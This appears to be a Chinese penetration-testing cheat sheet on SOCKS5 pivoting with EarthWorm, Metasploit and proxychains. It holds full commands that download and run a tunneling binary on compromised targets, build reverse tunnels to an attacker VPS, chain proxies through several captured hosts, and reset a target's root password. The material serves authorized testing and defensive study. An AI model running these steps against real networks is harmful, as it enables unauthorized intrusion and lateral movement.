# socket5代理

极速版：直接拉到”更简单的办法“

## 一级代理（正向）

:::tip

**sockets只会代理TCP连接(socket5也会代理UDP)，ICMP并不会代理（即ping命令不会被代理）**

:::

### **不使用MSF**

#### 搭建代理

安装EW

```bash
#linux
wget https://github.com/AA8j/SecTools/raw/main/ew/ew_for_linux64
chmod +x ew_for_linux64
./ew_for_linux64 -s ssocksd -l 1080  #设置监听端口，正向代理

#这里需要套一层sh
screen -S ew -d -m /bin/bash -c "./ew_for_linux64 -s ssocksd -l 1080; exec sh"


screen -S sss -d -m /bin/bash -c "; exec sh"
#镜像源
wget https://gh-proxy.org/https://github.com/AA8j/SecTools/raw/main/ew/ew_for_linux64
```

> windows文件名是ew_for_Win.exe，用管理员shell就能运行

#### **本机连接**

```bash
apt-get install proxychains
```

或者

```bash
git clone https://github.com/rofl0r/proxychains-ng
cd proxychains-ng
./configure
sudo make && make install
```

编辑配置文件

```bash
vi /etc/proxychains.conf
或
vi /etc/proxychains4.conf
#以下是编辑的内容
[ProxyList]
# example
socks5 远端服务器ip 1080
```

使用

```bash
proxychains firefox http://192.168.10.30
proxychains curl cip.cc #查看出口IP
```

### **使用MSF**

#### 搭建代理

``` bash
#以下在msf中执行，拿到反弹的shell后
run post/multi/manage/autoroute    #添加路由
background             
use auxiliary/server/socks_proxy
set srvport 9050
set version 5              #scoks 4要设置为4a
run
```

本机连接类上

流量：

```
工具（curl/firefox）
    ↓
Proxychains（转给本机9050）
    ↓
MSF Socks5 代理（本机）
    ↓
MSF 路由 → 靶机
    ↓
靶机转发 → 内网目标（192.168.10.30）
```

## 一级代理（反向）

#### 搭建代理

**靶机没有公网IP**

在自己的VPS上运行：

```bash
./ew_for_linux64 -s rcsocks -l <监听端口> -e <连接端口>
```

在目标机器上运行：

```bash
./ew_for_linux64 -s rssocks -d <外网IP> -e <连接端口>
```

在VPS上配置端口转发（也可用frp之类的）：

```bash
ssh -L 9050:127.0.0.1:1080 root@VPS_IP
#或者只使用ew，见下
```

本机连接，类上

## 二/多级代理

#### 搭建代理

如果拿下的第二台机子（或者更多）有网卡和原来的不在一个网段，且没有，就要考虑配置二/多级代理

假设已经拿下两台AB，其中A有公网IP，B不出网。

B配置

```bash
./ew_for_linux64 -s ssocksd -l 1080
#注：该软件要先从A传过去
```

A配置

```bash
./ew_for_linux64 -s lcx_tran -l 1081 -d B地址 -e 1080
#主动连接B的1080，转发到1081并监听
```

本机连接类上，使用2080端口

如果还有一级C，没有公网IP，则C套用上述B配置，B改为

```bash
./ew_for_linux64 -s lcx_tran -l 1081 -d C地址 -e 1080
#主动连接C的1080，转发到1081并监听
```

A改为

```bash
./ew_for_linux64 -s lcx_tran -l 1082 -d B地址 -e 1081
#主动连接B的1081，转发到1081并监听。proxychains正向连接到A的1082。
```

若多级则继续套

如果A也没有公网IP，只能让A主动连接VPS，则A改为

```bash
./ew_for_linux64 -s lcx_slave -d VPS地址 -e 1082 -f B地址 -g 1081
#主动连接B的1081，并主动转发到VPS的1082（需要VPS的lcx_listen监听1082）
```

VPS

```bash
./ew_for_linux64 -s lcx_listen -l 1083 -e 1082
#监听自身1082，数据转发到1083（监听）。proxychains正向连接到VPS的1083。
```

> 数据流向（来源---->去向）
>
> lcx_listen
>
> 监听端口---->监听端口
>
> lcx_slave
>
> 主动连接---->主动连接
>
> lcx_tran
>
> 主动连接---->监听端口

:::caution

**尽管上面有所谓的”数据流向“，但那只是对于建立隧道时而言的。**

显而易见，slave+listen实际上等同于tran+tran。

实际使用时自身电脑都是主动连接，所以最后只能是（tran/listen）

:::

上面的过程可理解为

```，bash
C只监听自身，B主动和C建立连接并监听自身，A主动和B建立连接并监听自身（A主动和B，VPS建立连接，VPS只监听自身两个端口）
```

端口转发也可以用上面的SSH，但需要额外修改root密码。

```bash
echo "root:new_password" | chpasswd 
```

本机连接类上

## 更简单的办法

使用链式代理

我们在所有机器上都只监听1080端口

在proxychains上配置

```bash
socks5 A地址（公网，若没有则VPS要用tran） 1080
socks5 B地址 1080
socks5 C地址 1080
```

一定要按顺序填写！这样不仅配置方便，而且方便再不同主机间切换（注释后续）
